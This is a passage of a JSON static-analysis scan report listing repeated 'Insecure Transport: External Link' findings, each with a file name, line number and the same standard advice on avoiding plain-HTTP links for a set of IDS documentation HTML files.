            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4374/?engineType=SCA&issue=07690CB1D72EC58360BB6A34522D345B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4375",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Interface.html on line 143 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4375/?engineType=SCA&issue=07690CB1D72EC58360BB6A34522D345C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4467",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Memcached.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4467/?engineType=SCA&issue=4450ED2B62850D62AE951A9844C2821C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4468",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Memcached.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4468/?engineType=SCA&issue=4450ED2B62850D62AE951A9844C2821D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4469",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Memcached.html on line 240 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4469/?engineType=SCA&issue=4450ED2B62850D62AE951A9844C2821E"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4464",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Session.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4464/?engineType=SCA&issue=420180E8FBE76AC26E274D4FEA001C4B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4465",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Session.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4465/?engineType=SCA&issue=420180E8FBE76AC26E274D4FEA001C4C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4466",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Session.html on line 238 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4466/?engineType=SCA&issue=420180E8FBE76AC26E274D4FEA001C4D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4475",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Converter.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4475/?engineType=SCA&issue=4E246334D04ABDCB26CEFA0A987ECFF1"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4476",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Converter.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4476/?engineType=SCA&issue=4E246334D04ABDCB26CEFA0A987ECFF2"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4477",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Converter.html on line 717 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4477/?engineType=SCA&issue=4E246334D04ABDCB26CEFA0A987ECFF3"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4759",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Event.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4759/?engineType=SCA&issue=FDC8A69C8EDDB33B7891555FF970A5E4"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4760",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Event.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4760/?engineType=SCA&issue=FDC8A69C8EDDB33B7891555FF970A5E5"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4761",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Event.html on line 510 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4761/?engineType=SCA&issue=FDC8A69C8EDDB33B7891555FF970A5E6"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4510",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4510/?engineType=SCA&issue=5D5DF7E163324B3D3938851BD3800251"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4511",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter.html on line 35 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4511/?engineType=SCA&issue=5D5DF7E163324B3D3938851BD3800252"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4512",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter.html on line 449 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4512/?engineType=SCA&issue=5D5DF7E163324B3D3938851BD3800253"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4549",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter_Storage.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4549/?engineType=SCA&issue=75BA5DECA7B8F10836514DEE1CFF6C02"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4550",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter_Storage.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4550/?engineType=SCA&issue=75BA5DECA7B8F10836514DEE1CFF6C03"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4551",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter_Storage.html on line 416 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4551/?engineType=SCA&issue=75BA5DECA7B8F10836514DEE1CFF6C04"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4519",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Filter_Storage_Abstract.html on line 325 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4519/?engineType=SCA&issue=62B681357431DA46F5079AF236D757E4"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4719",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Init.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4719/?engineType=SCA&issue=E99A4C23F462904BE6EFA27D9C5417E6"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4720",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Init.html on line 35 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see 